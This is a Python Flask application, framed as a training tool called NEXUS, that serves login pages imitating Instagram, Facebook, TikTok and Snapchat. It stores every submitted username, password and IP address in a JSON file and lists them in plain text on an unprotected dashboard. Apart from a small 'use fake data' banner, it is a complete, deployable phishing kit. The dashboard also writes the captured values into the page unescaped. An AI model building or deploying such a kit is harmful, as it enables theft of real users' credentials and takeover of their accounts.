#!/usr/bin/env python3
from flask import Flask, request
import json
import os
import datetime

app = Flask(__name__)
LOG_FILE = "captures.json"

if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f:
        json.dump([], f)

# Platform data with REAL designs
PLATFORMS = {
    'instagram': {
        'icon': '📸',
        'name': 'Instagram',
        'color': '#E4405F',
        'gradient': 'linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%)',
        'bg': '#fafafa',
        'text': '#262626',
        'logo': 'Instagram',
        'design': 'instagram'
    },
    'facebook': {
        'icon': '👍',
        'name': 'Facebook',
        'color': '#1877F2',
        'gradient': 'linear-gradient(135deg, #1877F2 0%, #0d65d9 100%)',
        'bg': '#f0f2f5',
        'text': '#1b1f23',
        'logo': 'f',
        'design': 'facebook'
    },
    'tiktok': {
        'icon': '🎵',
        'name': 'TikTok',
        'color': '#000000',
        'gradient': 'linear-gradient(135deg, #000000 0%, #25f4ee 50%, #fe2c55 100%)',
        'bg': '#ffffff',
        'text': '#000000',
        'logo': 'TikTok',
        'design': 'tiktok'
    },
    'snapchat': {
        'icon': '👻',
        'name': 'Snapchat',
        'color': '#FFFC00',
        'gradient': 'linear-gradient(135deg, #FFFC00 0%, #f5e800 100%)',
        'bg': '#f5f5f5',
        'text': '#000000',
        'logo': 'Snapchat',
        'design': 'snapchat'
    }
}

# Home page - platform grid with REAL platform colors and styles
HTML_HOME = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXUS</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 500px; width: 100%; text-align: center; }
        .icon { font-size: 60px; margin-bottom: 10px; }
        h1 { font-size: 36px; font-weight: 700; color: #111; margin-bottom: 6px; }
        .sub { font-size: 16px; color: #666; margin-bottom: 30px; }
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin: 20px 0;
        }
        .platform {
            padding: 20px 10px;
            border-radius: 16px;
            border: 1px solid #eee;
            transition: 0.2s;
            text-decoration: none;
            color: #111;
            display: block;
            background: #f5f5f5;
            position: relative;
            overflow: hidden;
        }
        .platform:active { transform: scale(0.95); }
        .platform .emoji-icon { font-size: 48px; display: block; margin-bottom: 8px; }
        .platform span { display: block; font-weight: 600; font-size: 14px; }
        
        /* Instagram style */
        .platform.instagram { 
            background: #fafafa; 
            border-color: #E4405F; 
            box-shadow: 0 2px 10px rgba(228, 64, 95, 0.1);
        }
        .platform.instagram span { color: #E4405F; }
        .platform.instagram::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
        }
        
        /* Facebook style */
        .platform.facebook { 
            background: #f0f2f5; 
            border-color: #1877F2;
            box-shadow: 0 2px 10px rgba(24, 119, 242, 0.1);
        }
        .platform.facebook span { color: #1877F2; }
        .platform.facebook::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: #1877F2;
        }
        
        /* TikTok style */
        .platform.tiktok { 
            background: #ffffff; 
            border-color: #000000;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
        }
        .platform.tiktok span { color: #000000; }
        .platform.tiktok::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, #000000, #25f4ee, #fe2c55);
        }
        
        /* Snapchat style */
        .platform.snapchat { 
            background: #f5f5f5; 
            border-color: #FFFC00;
            box-shadow: 0 2px 10px rgba(255, 252, 0, 0.2);
        }
        .platform.snapchat span { color: #000000; }
        .platform.snapchat::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: #FFFC00;
        }
        
        .platform .badge {
            position: absolute;
            top: 8px;
            right: 8px;
            font-size: 10px;
            background: #00000010;
            padding: 2px 8px;
            border-radius: 10px;
            color: #666;
        }
        .footer { margin-top: 30px; font-size: 14px; color: #999; }
        .footer span { color: #111; font-weight: 500; }
        .warning {
            font-size: 14px;
            color: #e74c3c;
            font-weight: 500;
            margin-bottom: 20px;
            background: #fef0ef;
            padding: 10px 14px;
            border-radius: 10px;
            display: inline-block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🧸</div>
        <h1>NEXUS</h1>
        <p class="sub">Learn cybersecurity by doing</p>
        <div class="warning">⚠️ Training mode — use fake data</div>
        <div class="grid">
            <a href="/login/instagram" class="platform instagram">
                <span class="emoji-icon">📸</span>
                <span>Instagram</span>
                <span class="badge">🔒</span>
            </a>
            <a href="/login/facebook" class="platform facebook">
                <span class="emoji-icon">👍</span>
                <span>Facebook</span>
                <span class="badge">🔒</span>
            </a>
            <a href="/login/tiktok" class="platform tiktok">
                <span class="emoji-icon">🎵</span>
                <span>TikTok</span>
                <span class="badge">🔒</span>
            </a>
            <a href="/login/snapchat" class="platform snapchat">
                <span class="emoji-icon">👻</span>
                <span>Snapchat</span>
                <span class="badge">🔒</span>
            </a>
        </div>
        <p class="footer">Built by <span>Luiz Vad</span> 🧸</p>
    </div>
</body>
</html>
"""

# Login page templates for each platform (REAL DESIGNS)
def get_login_html(platform_data, platform_name):
    platform = platform_name.lower()
    data = platform_data
    
    if platform == 'instagram':
        return f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        html, body {{
            height: 100%;
            width: 100%;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background: #fafafa;
        }}
        .container {{
            max-width: 380px;
            width: 100%;
            text-align: center;
            background: #ffffff;
            border-radius: 16px;
            padding: 40px 30px 30px 30px;
            border: 1px solid #dbdbdb;
        }}
        .logo {{
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            font-size: 42px;
            font-weight: 700;
            color: #262626;
            margin-bottom: 20px;
            letter-spacing: -2px;
        }}
        .input-group {{
            position: relative;
            margin: 8px 0;
        }}
        .input-group input {{
            width: 100%;
            padding: 12px 14px;
            padding-right: 48px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 6px;
            font-size: 14px;
            color: #262626;
            transition: 0.2s;
        }}
        .input-group input:focus {{
            outline: none;
            border-color: #a8a8a8;
            background: #fff;
        }}
        .input-group input::placeholder {{
            color: #8e8e8e;
        }}
        .toggle-password {{
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            font-size: 20px;
            cursor: pointer;
            padding: 0;
            color: #8e8e8e;
            line-height: 1;
            opacity: 0.7;
        }}
        .toggle-password:hover {{ opacity: 1; }}
        button[type="submit"] {{
            width: 100%;
            padding: 10px;
            background: #0095f6;
            color: #ffffff;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 12px;
            transition: 0.2s;
        }}
        button[type="submit"]:hover {{ background: #0075d4; }}
        .divider {{
            border: none;
            border-top: 1px solid #dbdbdb;
            margin: 20px 0;
        }}
        .back {{
            display: inline-block;
            margin-top: 10px;
            color: #0095f6;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }}
        .footer {{
            margin-top: 15px;
            font-size: 12px;
            color: #8e8e8e;
        }}
        .footer span {{ color: #262626; font-weight: 500; }}
        .warning-text {{
            font-size: 13px;
            color: #ed4956;
            font-weight: 500;
            margin-bottom: 15px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📸 Instagram</div>
        <p class="warning-text">⚠️ Training mode — use fake data</p>
        <form action="/login/instagram" method="POST">
            <div class="input-group">
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" id="password" placeholder="Password" required>
                <button type="button" class="toggle-password" id="toggleBtn" onclick="togglePassword()">👁️</button>
            </div>
            <button type="submit">Log In</button>
        </form>
        <hr class="divider">
        <a href="/" class="back">← Go back</a>
        <p class="footer">Built by <span>Luiz Vad</span> 🧸</p>
    </div>
    <script>
        function togglePassword() {{
            const input = document.getElementById('password');
            const btn = document.getElementById('toggleBtn');
            if (input.type === 'password') {{
                input.type = 'text';
                btn.textContent = '🙈';
            }} else {{
                input.type = 'password';
                btn.textContent = '👁️';
            }}
        }}
    </script>
</body>
</html>
"""
    
    elif platform == 'facebook':
        return f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        html, body {{
            height: 100%;
            width: 100%;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background: #f0f2f5;
        }}
        .container {{
            max-width: 400px;
            width: 100%;
            text-align: center;
            background: #ffffff;
            border-radius: 12px;
            padding: 40px 30px 30px 30px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }}
        .logo {{
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            font-size: 38px;
            font-weight: 700;
            color: #1877F2;
            margin-bottom: 20px;
            letter-spacing: -1px;
        }}
        .input-group {{
            position: relative;
            margin: 8px 0;
        }}
        .input-group input {{
            width: 100%;
            padding: 14px 16px;
            padding-right: 48px;
            background: #f5f6f7;
            border: 1px solid #dddfe2;
            border-radius: 8px;
            font-size: 16px;
            color: #1b1f23;
            transition: 0.2s;
        }}
        .input-group input:focus {{
            outline: none;
            border-color: #1877F2;
            background: #fff;
            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.1);
        }}
        .toggle-password {{
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            font-size: 20px;
            cursor: pointer;
            padding: 0;
            color: #8e8e8e;
            line-height: 1;
            opacity: 0.6;
        }}
        .toggle-password:hover {{ opacity: 1; }}
        button[type="submit"] {{
            width: 100%;
            padding: 12px;
            background: #1877F2;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 12px;
            transition: 0.2s;
        }}
        button[type="submit"]:hover {{ background: #0d65d9; }}
        .divider {{
            border: none;
            border-top: 1px solid #dadde1;
            margin: 20px 0;
        }}
        .back {{
            display: inline-block;
            margin-top: 10px;
            color: #1877F2;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }}
        .footer {{
            margin-top: 15px;
            font-size: 12px;
            color: #8e8e8e;
        }}
        .footer span {{ color: #1b1f23; font-weight: 500; }}
        .warning-text {{
            font-size: 13px;
            color: #e74c3c;
            font-weight: 500;
            margin-bottom: 15px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">👍 Facebook</div>
        <p class="warning-text">⚠️ Training mode — use fake data</p>
        <form action="/login/facebook" method="POST">
            <div class="input-group">
                <input type="text" name="username" placeholder="Email or phone number" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" id="password" placeholder="Password" required>
                <button type="button" class="toggle-password" id="toggleBtn" onclick="togglePassword()">👁️</button>
            </div>
            <button type="submit">Log In</button>
        </form>
        <hr class="divider">
        <a href="/" class="back">← Go back</a>
        <p class="footer">Built by <span>Luiz Vad</span> 🧸</p>
    </div>
    <script>
        function togglePassword() {{
            const input = document.getElementById('password');
            const btn = document.getElementById('toggleBtn');
            if (input.type === 'password') {{
                input.type = 'text';
                btn.textContent = '🙈';
            }} else {{
                input.type = 'password';
                btn.textContent = '👁️';
            }}
        }}
    </script>
</body>
</html>
"""
    
    elif platform == 'tiktok':
        return f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        html, body {{
            height: 100%;
            width: 100%;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background: #ffffff;
        }}
        .container {{
            max-width: 400px;
            width: 100%;
            text-align: center;
            background: #ffffff;
            border-radius: 20px;
            padding: 40px 30px 30px 30px;
            border: 1px solid #e8e8e8;
            box-shadow: 0 2px 20px rgba(0,0,0,0.04);
        }}
        .logo {{
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            font-size: 36px;
            font-weight: 700;
            color: #000000;
            margin-bottom: 20px;
            letter-spacing: -1px;
        }}
        .logo span {{ color: #25f4ee; }}
        .input-group {{
            position: relative;
            margin: 8px 0;
        }}
        .input-group input {{
            width: 100%;
            padding: 14px 16px;
            padding-right: 48px;
            background: #f5f5f5;
            border: 1px solid #e0e0e0;
            border-radius: 12px;
            font-size: 16px;
            color: #111;
            transition: 0.2s;
        }}
        .input-group input:focus {{
            outline: none;
            border-color: #000000;
            background: #fff;
        }}
        .toggle-password {{
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            font-size: 20px;
            cursor: pointer;
            padding: 0;
            color: #888;
            line-height: 1;
            opacity: 0.6;
        }}
        .toggle-password:hover {{ opacity: 1; }}
        button[type="submit"] {{
            width: 100%;
            padding: 14px;
            background: #000000;
            color: #ffffff;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 12px;
            transition: 0.2s;
        }}
        button[type="submit"]:hover {{ background: #222; }}
        .divider {{
            border: none;
            border-top: 1px solid #e8e8e8;
            margin: 20px 0;
        }}
        .back {{
            display: inline-block;
            margin-top: 10px;
            color: #000000;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            opacity: 0.7;
        }}
        .back:hover {{ opacity: 1; }}
        .footer {{
            margin-top: 15px;
            font-size: 12px;
            color: #999;
        }}
        .footer span {{ color: #111; font-weight: 500; }}
        .warning-text {{
            font-size: 13px;
            color: #fe2c55;
            font-weight: 500;
            margin-bottom: 15px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🎵 TikTok</div>
        <p class="warning-text">⚠️ Training mode — use fake data</p>
        <form action="/login/tiktok" method="POST">
            <div class="input-group">
                <input type="text" name="username" placeholder="Username" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" id="password" placeholder="Password" required>
                <button type="button" class="toggle-password" id="toggleBtn" onclick="togglePassword()">👁️</button>
            </div>
            <button type="submit">Log In</button>
        </form>
        <hr class="divider">
        <a href="/" class="back">← Go back</a>
        <p class="footer">Built by <span>Luiz Vad</span> 🧸</p>
    </div>
    <script>
        function togglePassword() {{
            const input = document.getElementById('password');
            const btn = document.getElementById('toggleBtn');
            if (input.type === 'password') {{
                input.type = 'text';
                btn.textContent = '🙈';
            }} else {{
                input.type = 'password';
                btn.textContent = '👁️';
            }}
        }}
    </script>
</body>
</html>
"""
    
    else:  # snapchat
        return f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Snapchat</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        html, body {{
            height: 100%;
            width: 100%;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background: #f5f5f5;
        }}
        .container {{
            max-width: 400px;
            width: 100%;
            text-align: center;
            background: #ffffff;
            border-radius: 20px;
            padding: 40px 30px 30px 30px;
            border: 2px solid #FFFC00;
            box-shadow: 0 2px 30px rgba(255, 252, 0, 0.15);
        }}
        .logo {{
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            font-size: 34px;
            font-weight: 700;
            color: #000000;
            margin-bottom: 20px;
            letter-spacing: -1px;
        }}
        .logo span {{ color: #FFFC00; }}
        .input-group {{
            position: relative;
            margin: 8px 0;
        }}
        .input-group input {{
            width: 100%;
            padding: 14px 16px;
            padding-right: 48px;
            background: #f5f5f5;
            border: 1px solid #e0e0e0;
            border-radius: 12px;
            font-size: 16px;
            color: #111;
            transition: 0.2s;
        }}
        .input-group input:focus {{
            outline: none;
            border-color: #FFFC00;
            background: #fff;
            box-shadow: 0 0 0 4px rgba(255, 252, 0, 0.15);
        }}
        .toggle-password {{
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            font-size: 20px;
            cursor: pointer;
            padding: 0;
            color: #888;
            line-height: 1;
            opacity: 0.6;
        }}
        .toggle-password:hover {{ opacity: 1; }}
        button[type="submit"] {{
            width: 100%;
            padding: 14px;
            background: #FFFC00;
            color: #000000;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 12px;
            transition: 0.2s;
        }}
        button[type="submit"]:hover {{ background: #f5e800; }}
        .divider {{
            border: none;
            border-top: 1px solid #e8e8e8;
            margin: 20px 0;
        }}
        .back {{
            display: inline-block;
            margin-top: 10px;
            color: #000000;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            opacity: 0.7;
        }}
        .back:hover {{ opacity: 1; }}
        .footer {{
            margin-top: 15px;
            font-size: 12px;
            color: #999;
        }}
        .footer span {{ color: #111; font-weight: 500; }}
        .warning-text {{
            font-size: 13px;
            color: #e74c3c;
            font-weight: 500;
            margin-bottom: 15px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">👻 Snapchat</div>
        <p class="warning-text">⚠️ Training mode — use fake data</p>
        <form action="/login/snapchat" method="POST">
            <div class="input-group">
                <input type="text" name="username" placeholder="Username" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" id="password" placeholder="Password" required>
                <button type="button" class="toggle-password" id="toggleBtn" onclick="togglePassword()">👁️</button>
            </div>
            <button type="submit">Log In</button>
        </form>
        <hr class="divider">
        <a href="/" class="back">← Go back</a>
        <p class="footer">Built by <span>Luiz Vad</span> 🧸</p>
    </div>
    <script>
        function togglePassword() {{
            const input = document.getElementById('password');
            const btn = document.getElementById('toggleBtn');
            if (input.type === 'password') {{
                input.type = 'text';
                btn.textContent = '🙈';
            }} else {{
                input.type = 'password';
                btn.textContent = '👁️';
            }}
        }}
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return HTML_HOME

@app.route('/login/<platform>')
def login_page(platform):
    platform = platform.lower()
    if platform not in PLATFORMS:
        return "Platform not found", 404
    return get_login_html(PLATFORMS[platform], platform)

@app.route('/login/<platform>', methods=['POST'])
def login_post(platform):
    platform = platform.lower()
    if platform not in PLATFORMS:
        return "Platform not found", 404
    
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    ip = request.remote_addr
    
    with open(LOG_FILE, "r") as f:
        logs = json.load(f)
    
    logs.append({
        "timestamp": str(datetime.datetime.now()),
        "platform": PLATFORMS[platform]['name'],
        "username": username,
        "password": password,
        "ip": ip
    })
    
    with open(LOG_FILE, "w") as f:
        json.dump(logs, f, indent=4)
    
    return """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body {
            height: 100%;
            background: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container { max-width: 400px; width: 100%; text-align: center; }
        h1 { font-size: 40px; color: #111; margin-bottom: 6px; }
        .icon { font-size: 60px; }
        .msg { font-size: 18px; color: #333; margin: 20px 0; }
        .sub { font-size: 16px; color: #666; }
        a {
            display: inline-block;
            margin-top: 25px;
            color: #007aff;
            text-decoration: none;
            font-size: 18px;
            font-weight: 500;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🧸</div>
        <h1>NEXUS</h1>
        <p class="msg">⚠️ This is a training honeypot.</p>
        <p class="sub">Your data has been recorded.</p>
        <a href="/">← Go back</a>
    </div>
</body>
</html>
    """

@app.route('/dashboard')
def dashboard():
    with open(LOG_FILE, "r") as f:
        logs = json.load(f)
    
    html = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            padding: 20px;
            max-width: 700px;
            margin: 0 auto;
        }
        h1 { font-size: 32px; color: #111; margin-bottom: 8px; }
        .back { color: #007aff; text-decoration: none; font-size: 16px; }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            font-size: 14px;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 10px 8px;
            text-align: left;
        }
        th { background: #f5f5f5; color: #111; font-weight: 600; }
        tr:nth-child(even) { background: #fafafa; }
        .total { color: #666; margin-top: 20px; font-size: 14px; }
    </style>
</head>
<body>
    <h1>📊 NEXUS Dashboard</h1>
    <p><a href="/" class="back">← Go back</a></p>
    <table>
        <tr><th>Time</th><th>Platform</th><th>Name</th><th>Password</th><th>IP</th></tr>
    """
    
    for log in logs[-20:]:
        html += f"<tr><td>{log['timestamp']}</td><td>{log.get('platform', 'N/A')}</td><td>{log['username']}</td><td>{log['password']}</td><td>{log['ip']}</td></tr>"
    
    html += f"""
    </table>
    <p class="total">Total attempts: {len(logs)}</p>
</body>
</html>
    """
    return html

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
